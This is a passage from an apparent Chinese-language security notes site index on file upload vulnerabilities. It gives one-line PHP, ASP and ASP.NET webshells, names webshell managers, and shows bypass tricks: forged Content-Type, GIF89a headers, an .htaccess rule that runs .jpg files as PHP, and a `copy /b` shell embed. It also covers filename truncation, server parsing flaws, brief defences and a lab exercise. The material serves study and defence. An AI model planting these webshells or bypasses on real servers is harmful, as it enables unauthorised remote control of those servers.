<%eval request(\"x\")%> ASP.NET <%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"x\"],\"unsafe\");%> WebShell\u7ba1\u7406\u5de5\u5177 \u4e2d\u56fd\u8681\u5251 Github-\u52a0\u8f7d\u5668 Github-\u4e3b\u7a0b\u5e8f \u5b98\u65b9\u6587\u6863 \u4e2d\u56fd\u8681\u5251\u662f\u4e00\u6b3e\u5f00\u6e90\u7684\u8de8\u5e73\u53f0\u7f51\u7ad9\u7ba1\u7406\u5de5\u5177\uff0c\u4e5f\u662f\u4e00\u6b3eWebShell\u7ba1\u7406\u5de5\u5177\uff0c\u5b83\u4e3b\u8981\u9762\u5411\u4e8e\u5408\u6cd5\u6388\u6743\u7684\u6e17\u900f\u6d4b\u8bd5\u5b89\u5168\u4eba\u5458\u4ee5\u53ca\u8fdb\u884c\u5e38\u89c4\u64cd\u4f5c\u7684\u7f51\u7ad9\u7ba1\u7406\u5458\u3002\u4e2d\u56fd\u8681\u5251\u7684\u6838\u5fc3\u4ee3\u7801\u6a21\u677f\u5747\u6539\u81ea\u4e2d\u56fd\u83dc\u5200\u3002 \u51b0\u874e Github \u54e5\u65af\u62c9 Github \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u6982\u8ff0 \u5927\u90e8\u5206\u7ad9\u70b9\u90fd\u5177\u6709\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd, \u5982\u5934\u50cf\u4fee\u6539, \u6587\u7ae0\u7f16\u8f91, \u9644\u4ef6\u4e0a\u4f20\u7b49, \u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u7684\u4f5c\u7528\u662f\u5c06\u672c\u5730\u6587\u4ef6\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u4fdd\u5b58\u3002 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u6ca1\u6709\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u505a\u5408\u7406\u4e25\u8c28\u7684\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u7528\u6237\u53ef\u4ee5\u5229\u7528\u6b64 \u529f\u80fd\uff0c\u4e0a\u4f20\u80fd\u88ab\u670d\u52a1\u7aef\u89e3\u6790\u6267\u884c\u7684\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6b64\u6587\u4ef6\u83b7\u5f97\u6267\u884c\u670d\u52a1\u7aef\u547d\u4ee4\u7684\u80fd\u529b\u3002 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7ed5\u8fc7 \u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u9a8c\u8bc1\u6d41\u7a0b \u5ba2\u6237\u7aef JavaScript \u9a8c\u8bc1 \u670d\u52a1\u7aef MIME \u7c7b\u578b\u9a8c\u8bc1(Content-Type) \u670d\u52a1\u7aef\u6587\u4ef6\u6269\u5c55\u540d\u9a8c\u8bc1 \u9ed1\u540d\u5355 \u767d\u540d\u5355 \u670d\u52a1\u5668\u6587\u4ef6\u5185\u5bb9\u9a8c\u8bc1 \u6587\u4ef6\u5934(\u6587\u4ef6\u5e7b\u6570) \u6587\u4ef6\u52a0\u8f7d\u68c0\u6d4b \u5ba2\u6237\u7aef JavaScript \u9a8c\u8bc1 < script type = \"text/javascript\" > function checkUpload ( fileobj ) { var fileArr = fileobj . value . split ( '.' ); //\u5bf9\u6587\u4ef6\u540d\u8fdb\u884c\u5904\u7406 var ext = fileArr [ fileArr . length - 1 ]; //\u5f97\u5230\u6587\u4ef6\u6269\u5c55\u540d if ( ext != 'gif' ) { //\u9a8c\u8bc1\u6269\u5c55\u540d alert ( 'Only upload GIF images.' ); fileobj . value = '' ; //\u6e05\u9664\u6570\u636e } } </ script > \u670d\u52a1\u7aef MIME \u7c7b\u578b\u9a8c\u8bc1 MIME \u7c7b\u578b\u662f\u63cf\u8ff0\u6d88\u606f\u5185\u5bb9\u7c7b\u578b\u7684\u56e0\u7279\u7f51\u6807\u51c6\u3002 //\u68c0\u6d4bContent-type if($_FILES['fupload']['type']!=\"image/gif\") { exit(\"Only upload GIF images.\"); } \u5229\u7528 Burpsuite \u6293\u5305\uff0c\u5c06\u62a5\u6587\u4e2d\u7684Content-Type\u6539\u6210\u5141\u8bb8\u7684\u7c7b\u578b\u5373\u53ef\u7ed5\u8fc7 Content-Type:image/gif Content-Type:image/jpg Content-Type:image/png \u670d\u52a1\u5668\u6587\u4ef6\u5185\u5bb9\u9a8c\u8bc1-\u6587\u4ef6\u5934 \u56fe\u7247\u683c\u5f0f\u5f80\u5f80\u4e0d\u662f\u6839\u636e\u6587\u4ef6\u540e\u7f00\u540d\u53bb\u505a\u5224\u65ad\u7684\u3002\u6587\u4ef6\u5934\u662f\u6587\u4ef6\u5f00\u5934\u7684\u4e00\u6bb5\u4e8c\u8fdb\u5236\uff0c\u4e0d\u540c\u7684\u56fe\u7247\u7c7b\u578b\uff0c\u6587\u4ef6\u5934\u662f\u4e0d\u540c\u7684\u3002\u6587\u4ef6\u5934\u53c8\u79f0\u6587\u4ef6\u5e7b\u6570\u3002 \u5e38\u89c1\u6587\u4ef6\u5e7b\u6570 JPG: FF D8 FF E0 00 10 4A 46 49 46 GIF: 47 49 46 38 39 61 (GlF89a) PNG: 89 50 4E 47 \u901a\u8fc7\u5728 Burpsuite \u6293\u5305, \u5728\u6587\u4ef6\u5185\u5bb9\u524d\u6dfb\u52a0 GIF89a \u5b57\u6bb5\u53ef\u4ee5\u7ed5\u8fc7, \u5728\u56fe\u7247\u6587\u4ef6\u7ed3\u5c3e\u8ffd\u52a0 webshell \u5b57\u6bb5\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u7ed5\u8fc7. copy /b logo.jpg + shell.php shell.jpg \u670d\u52a1\u7aef\u6587\u4ef6\u6269\u5c55\u540d\u9a8c\u8bc1-\u9ed1\u540d\u5355 //\u68c0\u6d4b\u540e\u7f00\u540d $black_ext = explode(\"|\", \"asp|asa|cer|cdx|aspx|ashx|ascx|asax|php|php2|php3|php4|php5|asis|htaccess|htm|html|shtml|pwml|phtml|phtm|js|jsp|vbs|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini\"); //\u8f6c\u5316\u4e3a\u6570\u7ec4 if(in_array($file_ext,$black_ext)) { exit(\"Only upload GIF images.\"); } \u540e\u7f00\u540d\u5927\u5c0f\u5199\u7ed5\u8fc7 \u670d\u52a1\u7aef\u6ca1\u6709\u5c06\u540e\u7f00\u540d\u8f6c\u6362\u4e3a\u7edf\u4e00\u683c\u5f0f\u8fdb\u884c\u6bd4\u5bf9\uff0c\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20\u540e\u7f00\u4e3apHp\u7684\u6587\u4ef6\uff0c\u5728 Windows \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff0c\u6240\u4ee5 .pHp \u4ecd\u4f1a\u88ab\u5f53\u6210 PHP \u6587\u4ef6\u89e3\u6790. \u91cd\u5199\u7ed5\u8fc7 \u670d\u52a1\u7aef\u5c06\u9ed1\u540d\u5355\u7684\u540e\u7f00\u540d\u66ff\u6362\u4e3a\u7a7a\uff0c\u4f46\u4ec5\u8fdb\u884c\u4e00\u6b21\u3002\u4e0a\u4f20.phphpp\u540e\u7f00\uff0c\u66ff\u6362php\u4e00 \u6b21\u4e3a\u7a7a\uff0c\u5219\u540e\u7f00\u4e3a.php\u3002 \u7279\u6b8a\u53ef\u89e3\u6790\u540e\u7f00\u7ed5\u8fc7 \u9ed1\u540d\u5355\u89c4\u5219\u4e0d\u4e25\u8c28\uff0c\u5728\u67d0\u4e9b\u7279\u5b9a\u73af\u5883\u4e2d\u67d0\u4e9b\u7279\u6b8a\u540e\u7f00\u540d\u4ecd\u4f1a\u88ab\u5f53\u505aPHP\u6587\u4ef6\u89e3\u6790\u3002\u5982 phplphp2|php3|php4|php5|php6|php7|pht|phtm|phtml \u7b49, \u57fa\u4e8e debian \u548c ubuntu \u7684 apt-get \u5b89\u88c5 apache\uff0c\u9ed8\u8ba4\u5bf9\u4e8e\u6587\u4ef6\u7684\u89e3\u6790\u89c4\u5219\u5982\u4e0b: .htaccess \u7ed5\u8fc7 \u5728 Apache \u91cc\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f5c\u4e3a\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u7528\u6765\u63a7\u5236\u6240\u5728\u76ee\u5f55\u7684\u8bbf\u95ee\u6743\u9650\u4ee5\u53ca\u89e3\u6790\u8bbe\u7f6e\u3002\u901a\u8fc7\u8bbe\u7f6e\u53ef\u4ee5\u5c06\u8be5\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u4f5c\u4e3aphp\u6587\u4ef6\u6765\u89e3\u6790, .htaccess \u53ef\u4ee5\u5199\u5165Apache\u914d\u7f6e\u4fe1\u606f\uff0c\u6539\u53d8\u5f53\u524d\u76ee\u5f55\u4ee5\u53ca\u5b50\u76ee\u5f55\u7684 Apache \u914d\u7f6e\u3002 \u6b64\u65b9\u6cd5\u7ed5\u8fc7\u9700\u8981\u914d\u7f6e\u4e0a\u5141\u8bb8 .htaccess\u751f\u6548 Apache\u5f00\u542f rewrite \u6a21\u5757 Apache\u914d\u7f6e\u6587\u4ef6\u4e3a AllowOverride All \uff08\u9ed8\u8ba4\u4e3aNone\uff09 \u4ee5\u4e0b\u914d\u7f6e\u53ef\u4ee5\u8ba9 shell.jpg \u4f5c\u4e3a php \u811a\u672c\u89e3\u6790 <FilesMatch \".jpg\"> SetHandler application/x-httpd-php </FilesMatch> AddType application/x-httpd-php .gif \u64cd\u4f5c\u7cfb\u7edf\u7279\u6027\u7ed5\u8fc7(windows) \u5229\u7528 window \u5bf9\u4e8e\u6587\u4ef6\u548c\u6587\u4ef6\u540d\u7684\u9650\u5236\uff0c\u4ee5\u4e0b\u5b57\u7b26\u653e\u5728\u7ed3\u5c3e\u65f6\uff0c\u4e0d\u7b26\u5408\u64cd\u4f5c\u7cfb\u7edf\u7684\u547d\u540d\u89c4\u8303\uff0c\u5728\u6700\u540e\u751f\u6210\u6587\u4ef6\u65f6\uff0c\u5b57\u7b26\u4f1a\u88ab\u81ea\u52a8\u53bb\u9664\u3002 \u4e0a\u4f20\u6587\u4ef6\u540d \u670d\u52a1\u5668\u6587\u4ef6\u540d \u8bf4\u660e file.php[\u7a7a\u683c] file.php file.php[.] file.php \u4efb\u610f\u6570\u91cf.\u5747\u53ef file.php[%80-%99] file.php BurpSuite\u6293\u5305\uff0c\u5728\u6587\u4ef6\u540d\u7ed3\u5c3e\u8f93%80\uff0c CTRL+SHIFT+U\u8fdb\u884cURL-DECODE\uff0c \u6216\u8005\u589e\u52a0\u4e00\u4e2a\u7a7a\u683c\uff0c\u518d\u5728\u5728HEX\u89c6\u56fe\u4e3a\u628a20\u4fee\u6539\u4e3a80 file.php::$DATA file.php \u6587\u4ef6\u5185\u5bb9\u4e0d\u53d8 file.php::$DATA...... file.php \u6587\u4ef6\u5185\u5bb9\u4e0d\u53d8 \u670d\u52a1\u7aef\u6587\u4ef6\u6269\u5c55\u540d\u9a8c\u8bc1-\u9ed1\u540d\u5355\u7ed5\u8fc7 %00\u622a\u65ad php < 5.3.34 \u53ef\u7528 %00 \u662f chr(0)\uff0c\u5b83\u4e0d\u662f\u7a7a\u683c\uff0c\u662fNULL\uff0c\u7a7a\u5b57\u7b26\u3002 \u5f53\u7a0b\u5e8f\u5728\u8f93\u51fa\u542b\u6709 chr(0) \u53d8\u91cf\u65f6\uff0cchr(0) \u540e\u9762\u7684\u6570\u636e\u4f1a\u88ab\u505c\u6b62\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u8bef\u628a\u5b83\u5f53\u505a\u7ed3\u675f\u7b26\uff0c\u540e\u9762\u7684\u6570\u636e\u76f4\u63a5\u5ffd\u7565\uff0c\u8fd9\u5c31\u5bfc\u81f4\u6f0f\u6d1e\u4ea7\u751f\u7684\u539f\u56e0\u3002 \u5728\u6587\u4ef6\u4e0a\u4f20\u4e2d\uff0c\u5229\u7528 %00 \u622a\u65ad\uff0c\u5728\u6587\u4ef6\u6269\u5c55\u540d\u9a8c\u8bc1\u65f6\uff0c\u662f\u53d6\u6587\u4ef6\u7684\u6269\u5c55\u540d\u6765\u505a\u9a8c\u8bc1\uff0c\u4f46\u662f\u6700 \u540e\u6587\u4ef6\u4fdd\u5b58\u5728\u672c\u5730\u65f6\uff0c%00 \u4f1a\u622a\u65ad\u6587\u4ef6\u540d\uff0c\u53ea\u4fdd\u5b58 %00 \u4e4b\u524d\u7684\u5185\u5bb9\u3002 \u4e2d\u95f4\u4ef6\u6587\u4ef6\u89e3\u6790\u6f0f\u6d1e Apache \u89e3\u6790\u6f0f\u6d1e Apache \u89e3\u6790\u6587\u4ef6\u89c4\u5219\u65f6\u4ece\u53f3\u5230\u5de6. \u4f8b\u5982 shell.php.gix.ccc, apache \u4f1a\u5148\u8bc6\u522b ccc, ccc \u4e0d\u88ab\u8bc6\u522b, \u5219\u8bc6\u522b gix, \u4ee5\u6b64\u7c7b\u63a8, \u6700\u540e\u4f1a\u88ab\u8bc6\u522b\u4e3a php \u6267\u884c. https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html IIS6.0 \u89e3\u6790\u6f0f\u6d1e \u76ee\u5f55\u89e3\u6790 \u76ee\u5f55\u540d\u4e3a .asp \u3001 .asa \u3001 .cer \uff0c\u5219\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u90fd\u4f1a\u88ab\u4f5c\u4e3aASP\u89e3\u6790\u3002 url/test.asp/shelljpg \u4f1a\u88ab\u5f53\u4f5casp\u811a\u672c\u8fd0\u884c\u3002 \u6587\u4ef6\u89e3\u6790 \u6587\u4ef6\u540d\u4e2d\u5206\u53f7\u540e\u4e0d\u88ab\u89e3\u6790\uff0c\u4f8b\u5982 .asp; \u3001 .asa; \u3001 .cer; \u3002 url/test.asp;shell.jpg \u4f1a\u88ab\u5f53\u4f5casp\u811a\u672c\u8fd0\u884c\u3002 \u6587\u4ef6\u7c7b\u578b\u89e3\u6790 .asa \uff0c .cer \uff0c .cdx \u90fd\u4f1a\u88ab\u4f5c\u4e3a asp \u6587\u4ef6\u6267\u884c\u3002 url/shell.asa \u4f1a\u88ab\u4f5c\u4e3aasp\u6587\u4ef6\u6267\u884c\u3002 Nginx \u89e3\u6790\u6f0f\u6d1e PHP+Nginx \u9ed8\u8ba4\u662f\u4ee5cgi\u7684\u65b9\u5f0f\u53bb\u8fd0\u884c\uff0c\u5f53\u7528\u6237\u914d\u7f6e\u4e0d\u5f53\uff0c\u4f1a\u5bfc\u81f4\u4efb\u610f\u6587\u4ef6\u88ab\u5f53\u4f5cphp\u53bb\u89e3\u6790\u3002 \u5229\u7528\u6761\u4ef6 \u4ee5 FastCGl \u8fd0\u884c cgi.fix_pathinfo = 1 (\u5168\u7248\u672cPHP\u9ed8\u8ba4\u4e3a\u5f00\u542f) \u6ee1\u8db3\u4ee5\u4e0a\u6761\u4ef6\u65f6, \u8bbf\u95ee url/shell.jpg/shellphp \u65f6\uff0cshell.jpg \u4f1a\u88ab\u5f53\u4f5c php \u53bb\u6267\u884c\u3002 Nginx \u6587\u4ef6\u540d\u903b\u8f91\u6f0f\u6d1e\uff08CVE-2013-4547\uff09 \u5f71\u54cd\u7248\u672c : Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 \u5229\u7528\u8fc7\u7a0b : \u4e0a\u4f20\u4e00\u4e2a shell.jpg \u6587\u4ef6\uff0c\u6ce8\u610f\u6700\u540e\u4e3a\u7a7a\u683c \u8bbf\u95ee url/shell.jpg[0x20][0x00].php \uff08\u4e24\u4e2a\u4e2d\u62ec\u53f7\u4e2d\u7684\u6570\u5b57\u662f\u7528Burp\u5728Hex\u754c\u9762\u4e2d\u66f4\u6539) \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u9632\u5fa1 \u670d\u52a1\u7aef\u6587\u4ef6\u6269\u5c55\u540d\u4f7f\u7528\u767d\u540d\u5355\u68c0\u6d4b+\u6587\u4ef6\u540d\u91cd\u547d\u540d \u5bf9\u6587\u4ef6\u5185\u5bb9\u8fdb\u884c\u68c0\u6d4b \u5bf9\u4e2d\u95f4\u4ef6\u505a\u5b89\u5168\u7684\u914d\u7f6e \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7ec3\u4e60 Pass-01 \u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u4e3a\u5ba2\u6237\u7aef\u9650\u5236, \u53ef\u4ee5\u672c\u5730\u5220\u9664\u5bf9 checkFile \u51fd\u6570\u7684\u8c03\u7528\u5b9e\u73b0\u7ed5\u8fc7 \u5c06\u6587\u4ef6\u540e\u7f00\u6539\u4e3a jpg \u4e0a\u4f20, \u901a\u8fc7 Burpsuite \u6293\u5305\u4fee\u6539\u6587\u4ef6\u540d\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u7ed5\u8fc7","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"web/file_upload/#_1","text":"","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"web/file_upload/#webshell","text":"WebShell \u7b80\u79f0\u7f51\u9875\u540e\u95e8, \u662f\u884c\u5728 Web \u5e94\u7528\u4e4b\u4e0a\u7684\u8fdc\u7a0b\u63a7\u5236\u7a0b\u5e8f. WebShell \u5176\u5b9e\u5c31\u662f\u4e00\u5f20\u7f51\u9875, \u7531 PHP\u3001JSP\u3001ASP\u3001ASP.NET \u7b49\u8fd9\u7c7b Web \u5e94\u7528\u7a0b\u5e8f\u8bed\u8a00\u5f00\u53d1, \u4f46 WebShell \u5e76\u4e0d\u5177\u5907\u5e38\u89c1\u7f51\u9875\u7684\u529f\u80fd, \u4f8b\u5982\u767b\u5f55\u3001\u6ce8\u518c\u3001\u4fe1\u606f\u5c55\u793a\u7b49\u529f\u80fd, \u4e00\u822c\u4f1a\u5177\u5907\u6587\u4ef6\u7ba1\u7406\u3001\u7aef\u53e3\u626b\u63cf\u3001\u63d0\u6743\u3001\u83b7\u53d6\u7cfb\u7edf\u4fe1\u606f\u7b49\u529f\u80fd. \u62e5\u6709\u8f83\u5b8c\u6574\u529f\u80fd\u7684 WebShell, \u6211\u4eec\u4e00\u822c\u79f0\u4e3a\u5927\u9a6c. \u529f\u80fd\u7b80\u6613\u7684 Webshell \u79f0\u4e3a\u5c0f\u9a6c. \u9664\u6b64\u4e4b\u5916\u8fd8\u5b58\u5728\u4e00\u53e5\u8bdd\u6728\u9a6c\u3001\u83dc\u5200\u9a6c\u3001\u8131\u5e93\u9a6c\u7b49\u540d\u8bcd, \u662f\u5bf9\u4e8e WebShell \u529f\u80fd\u6216\u8005\u7279\u6027\u7684\u7b80\u79f0\u3002","title":"WebShell\u7b80\u4ecb"},{"location":"web/file_upload/#_2","text":"","title":"\u4e00\u53e5\u8bdd\u6728\u9a6c"},{"location":"web/file_upload/#php","text":"<?php @ eval ( $_POST [ x ]); ?> \u83b7\u53d6 POST \u8bf7\u6c42\u53c2\u6570\u4e2d x \u7684\u503c\u3002\u4f8b\u5982 POST \u8bf7\u6c42\u4e2d\u4f20\u9012 x=phpinfo(); \u90a3\u4e48 $_POST[x] \u5c31\u7b49\u540c\u4e8e phpinfo(); eval() \u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c PHP \u4ee3\u7801\u6267\u884c\u3002\u4f8b\u5982 eval('phpinfo();'), \u5176\u4e2d phpinfo();`\u4f1a\u88ab\u5f53\u505aPHP\u4ee3\u7801\u53bb\u6267\u884c\u3002 @ \u662f\u9519\u8bef\u63a7\u5236\u8fd0\u7b97\u7b26\uff0c\u5f53\u653e\u7f6e\u5728\u4e00\u4e2aPHP\u8868\u8fbe\u5f0f\u524d\u65f6\uff0c\u8be5\u8868\u8fbe\u5f0f\u4ea7\u751f\u7684\u4efb\u4f55\u9519\u8bef\u4fe1\u606f\u90fd\u88ab\u5ffd\u7565\u6389\u3002","title":"php \u4e00\u53e5\u8bdd\u6728\u9a6c"},{"location":"web/file_upload/#asp","text":"<%eval request(\"x\")%>","title":"ASP \u4e00\u53e5\u8bdd\u6728\u9a6c"},{"location":"web/file_upload/#aspnet","text":"<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"x\"],\"unsafe\");%>","title":"ASP.NET"},{"location":"web/file_upload/#webshell_1","text":"","title":"WebShell\u7ba1\u7406\u5de5\u5177"},{"location":"web/file_upload/#_3","text":"Github-\u52a0\u8f7d\u5668 Github-\u4e3b\u7a0b\u5e8f \u5b98\u65b9\u6587\u6863 \u4e2d\u56fd\u8681\u5251\u662f\u4e00\u6b3e\u5f00\u6e90\u7684\u8de8\u5e73\u53f0\u7f51\u7ad9\u7ba1\u7406\u5de5\u5177\uff0c\u4e5f\u662f\u4e00\u6b3eWebShell\u7ba1\u7406\u5de5\u5177\uff0c\u5b83\u4e3b\u8981\u9762\u5411\u4e8e\u5408\u6cd5\u6388\u6743\u7684\u6e17\u900f\u6d4b\u8bd5\u5b89\u5168\u4eba\u5458\u4ee5\u53ca\u8fdb\u884c\u5e38\u89c4\u64cd\u4f5c\u7684\u7f51\u7ad9\u7ba1\u7406\u5458\u3002\u4e2d\u56fd\u8681\u5251\u7684\u6838\u5fc3\u4ee3\u7801\u6a21\u677f\u5747\u6539\u81ea\u4e2d\u56fd\u83dc\u5200\u3002","title":"\u4e2d\u56fd\u8681\u5251"},{"location":"web/file_upload/#_4","text":"Github","title":"\u51b0\u874e"},{"location":"web/file_upload/#_5","text":"Github","title":"\u54e5\u65af\u62c9"},{"location":"web/file_upload/#_6","text":"\u5927\u90e8\u5206\u7ad9\u70b9\u90fd\u5177\u6709\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd, \u5982\u5934\u50cf\u4fee\u6539, \u6587\u7ae0\u7f16\u8f91, \u9644\u4ef6\u4e0a\u4f20\u7b49, \u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u7684\u4f5c\u7528\u662f\u5c06\u672c\u5730\u6587\u4ef6\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u4fdd\u5b58\u3002 \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u6ca1\u6709\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u505a\u5408\u7406\u4e25\u8c28\u7684\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u7528\u6237\u53ef\u4ee5\u5229\u7528\u6b64 \u529f\u80fd\uff0c\u4e0a\u4f20\u80fd\u88ab\u670d\u52a1\u7aef\u89e3\u6790\u6267\u884c\u7684\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6b64\u6587\u4ef6\u83b7\u5f97\u6267\u884c\u670d\u52a1\u7aef\u547d\u4ee4\u7684\u80fd\u529b\u3002","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u6982\u8ff0"},{"location":"web/file_upload/#_7","text":"","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7ed5\u8fc7"},{"location":"web/file_upload/#_8","text":"\u5ba2\u6237\u7aef JavaScript \u9a8c\u8bc1 \u670d\u52a1\u7aef MIME \u7c7b\u578b\u9a8c\u8bc1(Content-Type) \u670d\u52a1\u7aef\u6587\u4ef6\u6269\u5c55\u540d\u9a8c\u8bc1 \u9ed1\u540d\u5355 \u767d\u540d\u5355 \u670d\u52a1\u5668\u6587\u4ef6\u5185\u5bb9\u9a8c\u8bc1 \u6587\u4ef6\u5934(\u6587\u4ef6\u5e7b\u6570) \u6587\u4ef6\u52a0\u8f7d\u68c0\u6d4b","title":"\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u9a8c\u8bc1\u6d41\u7a0b"},{"location":"web/file_upload/#javascript","text":"< script type = \"text/javascript\" > function checkUpload ( fileobj ) { var fileArr = fileobj . value . split ( '.' ); //\u5bf9\u6587\u4ef6\u540d\u8fdb\u884c\u5904\u7406 var ext = fileArr [ fileArr . length - 1 ]; //\u5f97\u5230\u6587\u4ef6\u6269\u5c55\u540d if ( ext != 'gif' ) { //\u9a8c\u8bc1\u6269\u5c55\u540d alert ( 'Only upload GIF images.' ); fileobj . value = '' ; //\u6e05\u9664\u6570\u636e } } </ script >","title":"\u5ba2\u6237\u7aef JavaScript \u9a8c\u8bc1"},{"location":"web/file_upload/#mime","text":"MIME \u7c7b\u578b\u662f\u63cf\u8ff0\u6d88\u606f\u5185\u5bb9\u7c7b\u578b\u7684\u56e0\u7279\u7f51\u6807\u51c6\u3002 //\u68c0\u6d4bContent-type if($_FILES['fupload']['type']!=\"image/gif\") { exit(\"Only upload GIF images.\"); } \u5229\u7528 Burpsuite \u6293\u5305\uff0c\u5c06\u62a5\u6587\u4e2d\u7684Content-Type\u6539\u6210\u5141\u8bb8\u7684\u7c7b\u578b\u5373\u53ef\u7ed5\u8fc7 Content-Type:image/gif Content-Type:image/jpg Content-Type:image/png","title":"\u670d\u52a1\u7aef MIME \u7c7b\u578b\u9a8c\u8bc1"},{"location":"web/file_upload/#-","text":"\u56fe\u7247\u683c\u5f0f\u5f80\u5f80\u4e0d\u662f\u6839\u636e\u6587\u4ef6\u540e\u7f00\u540d\u53bb\u505a\u5224\u65ad\u7684\u3002\u6587\u4ef6\u5934\u662f\u6587\u4ef6\u5f00\u5934\u7684\u4e00\u6bb5\u4e8c\u8fdb\u5236\uff0c\u4e0d\u540c\u7684\u56fe\u7247\u7c7b\u578b\uff0c\u6587\u4ef6\u5934\u662f\u4e0d\u540c\u7684\u3002\u6587\u4ef6\u5934\u53c8\u79f0\u6587\u4ef6\u5e7b\u6570\u3002 \u5e38\u89c1\u6587\u4ef6\u5e7b\u6570 JPG: FF D8 FF E0 00 10 4A 46 49 46 GIF: 47 49 46 38 39 61 (GlF89a) PNG: 89 50 4E 47 \u901a\u8fc7\u5728 Burpsuite \u6293\u5305, \u5728\u6587\u4ef6\u5185\u5bb9\u524d\u6dfb\u52a0 GIF89a \u5b57\u6bb5\u53ef\u4ee5\u7ed5\u8fc7, \u5728\u56fe\u7247\u6587\u4ef6\u7ed3\u5c3e\u8ffd\u52a0 webshell \u5b57\u6bb5\u4e5f\u53ef\u4ee5\u5b9e\u73b0\u7ed5\u8fc7. copy /b logo.jpg + shell.php shell.jpg","title":"\u670d\u52a1\u5668\u6587\u4ef6\u5185\u5bb9\u9a8c\u8bc1-\u6587\u4ef6\u5934"},{"location":"web/file_upload/#-_1","text":"//\u68c0\u6d4b\u540e\u7f00\u540d $black_ext = explode(\"|\", \"asp|asa|cer|cdx|aspx|ashx|ascx|asax|php|php2|php3|php4|php5|asis|htaccess|htm|html|shtml|pwml|phtml|phtm|js|jsp|vbs|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini\"); //\u8f6c\u5316\u4e3a\u6570\u7ec4 if(in_array($file_ext,$black_ext)) { exit(\"Only upload GIF images.\"); }","title":"\u670d\u52a1\u7aef\u6587\u4ef6\u6269\u5c55\u540d\u9a8c\u8bc1-\u9ed1\u540d\u5355"},{"location":"web/file_upload/#_9","text":"\u670d\u52a1\u7aef\u6ca1\u6709\u5c06\u540e\u7f00\u540d\u8f6c\u6362\u4e3a\u7edf\u4e00\u683c\u5f0f\u8fdb\u884c\u6bd4\u5bf9\uff0c\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20\u540e\u7f00\u4e3apHp\u7684\u6587\u4ef6\uff0c\u5728 Windows \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff0c\u6240\u4ee5 .pHp \u4ecd\u4f1a\u88ab\u5f53\u6210 PHP \u6587\u4ef6\u89e3\u6790.","title":"\u540e\u7f00\u540d\u5927\u5c0f\u5199\u7ed5\u8fc7"},{"location":"web/file_upload/#_10","text":"\u670d\u52a1\u7aef\u5c06\u9ed1\u540d\u5355\u7684\u540e\u7f00\u540d\u66ff\u6362\u4e3a\u7a7a\uff0c\u4f46\u4ec5\u8fdb\u884c\u4e00\u6b21\u3002\u4e0a\u4f20.phphpp\u540e\u7f00\uff0c\u66ff\u6362php\u4e00 \u6b21\u4e3a\u7a7a\uff0c\u5219\u540e\u7f00\u4e3a.php\u3002","title":"\u91cd\u5199\u7ed5\u8fc7"},{"location":"web/file_upload/#_11","text":"\u9ed1\u540d\u5355\u89c4\u5219\u4e0d\u4e25\u8c28\uff0c\u5728\u67d0\u4e9b\u7279\u5b9a\u73af\u5883\u4e2d\u67d0\u4e9b\u7279\u6b8a\u540e\u7f00\u540d\u4ecd\u4f1a\u88ab\u5f53\u505aPHP\u6587\u4ef6\u89e3\u6790\u3002\u5982 phplphp2|php3|php4|php5|php6|php7|pht|phtm|phtml \u7b49, \u57fa\u4e8e debian \u548c ubuntu \u7684 apt-get \u5b89\u88c5 apache\uff0c\u9ed8\u8ba4\u5bf9\u4e8e\u6587\u4ef6\u7684\u89e3\u6790\u89c4\u5219\u5982\u4e0b:","title":"\u7279\u6b8a\u53ef\u89e3\u6790\u540e\u7f00\u7ed5\u8fc7"},{"location":"web/file_upload/#htaccess","text":"\u5728 Apache 